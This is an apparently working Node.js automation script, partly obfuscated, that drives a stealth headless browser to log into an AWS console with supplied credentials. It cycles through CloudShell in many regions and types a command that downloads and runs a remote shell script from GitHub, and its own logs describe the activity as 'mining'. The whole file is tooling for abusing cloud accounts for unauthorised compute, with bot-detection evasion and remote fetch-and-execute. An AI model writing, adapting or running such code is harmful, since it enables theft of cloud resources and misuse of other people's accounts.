 var e = e => Buffer.from(e, "base64").toString("utf8");
const a = !0,
      t = e("TDZ0Y0Vxc0t1SGo3NEJ5WA=="),
      i = e("YmFzZTY0"),
      r = e("c2hhMjU2"),
      o = e("YWVzLTI1Ni1jYmM=");
t, i, r, o;

const n = process.argv[3],
      u = process.argv[4],
      d = process.argv[5],
      s = "--show" === process.argv[6];
let l = !0;

const c = require("crypto"),
      w = require("puppeteer-extra");
e = require("puppeteer-extra-plugin-stealth");
w.use(e());

const p = require("clipboardy"),
      b = a => new Promise(e => setTimeout(e, a)),
      f = (...e) => a && console.log(...e);

var m;
e = (e = "9370d9126884abcd1a34e0b161d91e1b:80912a4c53d5083bc56ce79517ca0b12").split(":"),
m = Buffer.from(e.shift(), "hex"),
e = Buffer.from(e.join(":"), "hex"),
m = c.createDecipheriv(o, Buffer.from(c.createHash(r).update(t).digest(i).substr(0, 32)), m),
e = m.update(e);

const h = (e = Buffer.concat([e, m.final()])).toString(),
      g = async (e, a, t, i) => {
          f("login");
          try {
              return await e.goto(`https://${a}.signin.aws.amazon.com/console`, { waitUntil: "networkidle0", timeout: 6e4 }),
                     await e.waitForSelector("#username", { timeout: 3e5 }),
                     await e.type("#username", t),
                     await e.waitForSelector("#password", { timeout: 3e5 }),
                     await e.type("#password", i),
                     await b(500),
                     await e.click("#signin_button"),
                     await b(5e3),
                     { stt: "hit" };
          } catch (e) {
              return f("-- Error:", e.message), { stt: "retry", msg: "Other2" };
          }
      },
		y = async a => {
			var regions = [
				"us-east-1", "us-west-1", "ap-southeast-1", "ap-east-1", "ap-northeast-1", "me-south-1", "eu-south-2", "ap-northeast-2", "eu-west-1", "eu-west-3", "ca-central-1", "sa-east-1", "us-east-2", "us-west-2", "ap-south-1", "ap-southeast-2", "ap-southeast-3", "me-central-1", "eu-south-1", "ap-northeast-3", "eu-central-1", "eu-west-2", "eu-north-1","ap-south-2","ap-southeast-4","il-central-1","ca-west-1", "af-south-1"
			];
			const commands = [
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			"bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/traf1.sh)",
			];
			let e = 1;
			for (;;) {
				f(`========== LOOP MINING: ${e} ==========`);
				console.time("LoopMiningTime");
				var startTime = +new Date;

				for (let loop = 0; loop < 10; loop++) {
					f(`=== SUB-LOOP ${loop + 1}/10 ===`);
					const subStartTime = +new Date; // Th?i gian b?t d?u c?a SUB-LOOP
					const subRegions = regions.slice(loop * 3, (loop + 1) * 3);

					let errorCount = 0; // Ð?m s? l?n xu?t hi?n l?i

					for (let i = 0; i < subRegions.length; i++) {
						f(`---------- MINING REGION (${i + 1}/${subRegions.length}): ` + subRegions[i]);
						console.time("RegionMiningTime");

						await (async (t, region) => {
							let isMining = false;
							f("regionMining");
							try {
								var loginResult;
								try {
									await t.goto(`https://${region}.console.aws.amazon.com/cloudshell`, { waitUntil: "networkidle2", timeout: 40000 });
								} catch (error) {
									await t.goto(`https://${region}.console.aws.amazon.com/cloudshell`, { waitUntil: "networkidle2", timeout: 20000 });
								}
								await t.$("#nav-usernameMenu") || (
									l || (f("-- Sleep: 1 minutes before login"), await b(60000)),
									loginResult = await g(t, n, u, d),
									f("-- Login: ", "hit" === loginResult.stt ? "SUCCESS" : "FAILED"),
									"hit" !== loginResult.stt && process.exit(),
									await t.goto(`https://${region}.console.aws.amazon.com/cloudshell`, { waitUntil: "networkidle0", timeout: 50000 }),
									l = false
								);

								try {
									await t.waitForSelector(".ace_line", { timeout: 50000, polling: 2000 }); // Ki?m tra m?i 500ms

								} catch {
									f("-- Status: ERROR (MAYBE: OUT OF LIMIT)");
									return; // Thoát h?n n?u không tìm th?y .ace_line ngay t? d?u
								}

								do {
									lines = [];
									const elements = await t.$$(".ace_line");
									for (let j = 0; j < elements.length; j++) {
										const content = await t.evaluate(el => el?.textContent, elements[j]);
										content && /\S/.test(content) && lines.push(content.replace(/(&nbsp;|\s)+$/, ""));
									}

									// Ki?m tra dòng cu?i cùng và d?m b?o không ph?i undefined
									lastLine = lines[lines.length - 1]?.replace(/[\s\u00A0]+/g, " ").trim();
									if (!lastLine) {
										continue;  // Ti?p t?c vòng l?p n?u lastLine không h?p l?
									}
									try {
										await t.waitForSelector(".ace_line", { timeout: 10000, polling: 2500 }); // Ki?m tra m?i 500ms
									} catch {
										break;
									}
									await t.click(".ace_content");

									// Ki?m tra n?u lastLine th?a mãn di?u ki?n thoát
									if (lastLine && (lastLine.endsWith("~]$") || lastLine.includes("iloving") || lastLine.includes("$") || lastLine.includes("hahaha") || lastLine.includes("meomeo") || lastLine.includes("#2"))) {
										f("-- Status: Mining, Command Ready");
										break; // Thoát vòng l?p
									}
									// Ki?m tra n?u lastLine ch?a "Preparing your terminal..."
									if (lastLine && lastLine.endsWith("Trying")) {
										f("-- Status: Trying err");

										const aceContent = await t.$(".ace_content");
										if (aceContent) {
											f("-- .ace_content exists. Performing actions...");
											await t.click(".ace_content");
											await t.keyboard.press("Enter");
											f("-- Pressed Enter. Waiting for 3 seconds...");
											await b(4000); // Ch? 3 giây
										} else {
											f("-- Warning: .ace_content not found! Retrying...");
											await b(1000); // Ch? 1 giây
										}
										continue; // B? qua các ki?m tra khác và ti?p t?c vòng l?p
									}
									// Thêm th?i gian ch? gi?a các vòng l?p
									await b(1000);

								} while (true);

								f("-- Last line:", lastLine);

								// Sau khi thoát kh?i vòng l?p, th?c hi?n hành d?ng ti?p theo
								try {
									await t.click('#welcome-modal input[type="checkbox"]');
									await t.click('#welcome-modal button[data-testid="welcome-close"]');
									await t.click('button[data-id="awsccc-cb-btn-accept"]');
								} catch {}

								await b(1000);
								await t.click(".ace_content");
								await b(500);

								if (lastLine.endsWith("~]$") || lastLine.endsWith("$") || lastLine.endsWith("hahaha") || lastLine.endsWith("meomeo")) {
									f("-- Status: NOT mining");
									f("-- Action: Start mining...");
									await b(1000);
									await t.keyboard.press("Enter");
									await b(500);
									await t.keyboard.down("ControlLeft");
									await t.keyboard.press("KeyC");
									await t.keyboard.up("ControlLeft");
									await b(3000);
									await t.keyboard.type(commands[loop]);
									await t.keyboard.press("Enter");
									await b(1000);
								} else if (lastLine.includes("iloving")) {
									isMining = true;
									f("-- Status: Mining...");
									f("-- Action: Interacting...");
									await t.keyboard.press("Enter");
									await b(500);
								} else if (lastLine.startsWith("Trying")) { // Ði?u ki?n m?i
									f("-- Status: Retrying session...");
									await b(5000); // Ch? 5 giây
									await t.keyboard.press("Enter");
									await b(5000); // Ch? 5 giây
									await t.keyboard.press("Enter");
								} else {
									f("-- Status: Unknown...");
									await b(2000);
									await t.keyboard.press("Enter");
									await b(500);
								}
								f("-- regionMining OK");
							} catch (err) {
								f("-- Error:", err.message);

								// Tang d?m l?i n?u x?y ra TimeoutError
								if (err.message.includes("Navigation timeout of 25000 ms exceeded")) {
									errorCount++;
								}
							}

							return isMining;
						})(a, subRegions[i]);

						console.timeEnd("RegionMiningTime");
					}

					// N?u l?i x?y ra >= 3 l?n trong vòng l?p con, ngh? 2 ti?ng
					if (errorCount >= 3) {
						f(`-- Error occurred ${errorCount} times. Sleeping for 2 hours...`);
						await b(10000); // Ngh? 2 ti?ng
						break; // Thoát kh?i SUB-LOOP
					}

					const sleepTime = 00000 - (+new Date - subStartTime); // Tính th?i gian ngh? 200000
					if (sleepTime > 0) {
						f(`--- SUB-LOOP finished. Sleeping for ${Math.round(sleepTime / 1000)} seconds.`);
						await b(sleepTime); // Ngh? ngoi theo th?i gian tính toán
						await a.goto("about:blank");
					}
					f("==============================");
				}

				console.timeEnd("LoopMiningTime");
				const sleepTime = 1620000 - (+new Date - startTime);
				f("==============================");
				e++;
				if (sleepTime > 0) {
					await a.goto("about:blank");
					f("Sleep:", Math.round(sleepTime / 1000));
					await b(sleepTime);
				}
			}
		};



(async () => {
    try {
        const { browser, page } = await (async opts => {
            const { headless, ignoreImg, proxy, ua, cookies, executablePath, userDataDir, protocolTimeout } = opts;
            f("init");
            try {
                let u = { 
                    headless: !!headless, 
                    args: ["--no-sandbox", "--disable-setuid-sandbox"], 
                    protocolTimeout: protocolTimeout || 28000 
                };

                if (proxy) u.args.push("--proxy-server=https=" + proxy);
                if (executablePath) u.executablePath = executablePath;
                if (userDataDir) u.userDataDir = userDataDir;

                const browser = await w.launch(u);
                const [page] = await browser.pages();

                await page.setViewport({ width: 600, height: 700 });
                if (ua) await page.setUserAgent(ua);
                if (cookies) await page.setCookie(...cookies);
                await page.bringToFront();
                await page.setRequestInterception(true);

                page.on("request", req => {
                    if (!req.isInterceptResolutionHandled()) {
                        ignoreImg && req.resourceType() === "image" ? req.abort() : req.continue();
                    }
                });

                f("-- OK");
                return { browser, page };
            } catch (err) {
                f("-- Error:", err.message);
                return {};
            }
        })({ 
            headless: true, 
            ignoreImg: true, 
            executablePath: "/home/cloudshell-user/ungoogled-chromium_140.0.7339.137_1.vaapi_linux/chrome",
            userDataDir: "/home/cloudshell-user/chrome-profile" 
        });

        if (!page) {
            throw new Error("Page not initialized (Chromium may not have started).");
        }

        await y(page);

    } catch (err) {
        f("Error:", err.message);
    }
})();


